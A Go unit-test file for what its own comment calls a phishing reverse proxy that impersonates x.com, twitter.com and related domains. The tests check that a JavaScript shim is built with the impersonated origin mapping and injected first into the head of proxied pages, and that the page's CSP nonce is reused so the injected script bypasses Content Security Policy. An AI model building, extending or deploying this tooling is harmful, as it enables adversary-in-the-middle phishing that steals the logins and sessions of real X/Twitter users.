package main

import (
	"net/http"
	"strings"
	"testing"
)

// TestBuildShim verifies the shim template placeholder is replaced with the
// origin config and that the rendered output is valid JS with no leftover
// placeholder.
func TestBuildShim(t *testing.T) {
	shim := buildShim([]string{"x.com", "twitter.com", "twimg.com", "pscp.tv"})

	if strings.Contains(shim, "__XRP_CONFIG__") {
		t.Fatalf("shim still contains placeholder __XRP_CONFIG__")
	}
	if !strings.Contains(shim, `"prefix":"/_xrp/"`) {
		t.Fatalf("shim missing prefix config")
	}
	if !strings.Contains(shim, `"def":"x.com"`) {
		t.Fatalf("shim missing def config")
	}
	if !strings.Contains(shim, `"exact":["x.com","twitter.com","twimg.com","pscp.tv"]`) {
		t.Fatalf("shim missing exact origins config")
	}
	if !strings.Contains(shim, `".twimg.com"`) || !strings.Contains(shim, `".x.com"`) {
		t.Fatalf("shim missing subdomain suffix config")
	}
	// The mount logic must use exact (not just def) so twitter.com also maps
	// to the bare phish host.
	if !strings.Contains(shim, `C.exact.indexOf(h) >= 0 ? "" : MOUNT + h`) {
		t.Fatalf("shim missing corrected mount logic")
	}
}

// TestInjectShim verifies the shim script is inserted as the first child of
// <head> and reuses the page's CSP nonce.
func TestInjectShim(t *testing.T) {
	html := `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>x</title></head><body></body></html>`
	out := injectShim([]byte(html), "abc123")

	got := string(out)
	if !strings.HasPrefix(got, `<!DOCTYPE html><html lang="en"><head><script src="/_xrp/shim.js" nonce="abc123"></script>`) {
		t.Fatalf("shim not injected as first child of head: %s", got)
	}
	if !strings.Contains(got, `<meta charset="utf-8">`) {
		t.Fatalf("original head content lost")
	}
}

// TestInjectShimNoNonce verifies the script tag omits nonce when none is known.
func TestInjectShimNoNonce(t *testing.T) {
	out := injectShim([]byte(`<html><head></head><body>x</body></html>`), "")
	if !strings.Contains(string(out), `<script src="/_xrp/shim.js"></script>`) {
		t.Fatalf("expected shim script without nonce, got %s", out)
	}
}

// TestInjectShimNoHead falls back to after <html> when <head> is absent.
func TestInjectShimNoHead(t *testing.T) {
	out := injectShim([]byte(`<html><body>x</body></html>`), "")
	if !strings.HasPrefix(string(out), `<html><script src="/_xrp/shim.js"></script>`) {
		t.Fatalf("expected shim after <html>, got %s", out)
	}
}

// TestCspNonce extracts the nonce value from a CSP header.
func TestCspNonce(t *testing.T) {
	csp := "default-src 'self'; script-src 'self' 'nonce-abc123DEF==' 'unsafe-inline' https://abs.twimg.com"
	if got := cspNonce(csp); got != "abc123DEF==" {
		t.Fatalf("cspNonce = %q, want %q", got, "abc123DEF==")
	}
	if got := cspNonce("script-src 'self'"); got != "" {
		t.Fatalf("cspNonce with no nonce = %q, want empty", got)
	}
}

// TestIsHTML distinguishes HTML documents from other textual content.
func TestIsHTML(t *testing.T) {
	html := &http.Response{Header: http.Header{"Content-Type": []string{"text/html; charset=utf-8"}}}
	js := &http.Response{Header: http.Header{"Content-Type": []string{"application/javascript"}}}
	if !isHTML(html) {
		t.Fatalf("isHTML(text/html) = false, want true")
	}
	if isHTML(js) {
		t.Fatalf("isHTML(application/javascript) = true, want false")
	}
}
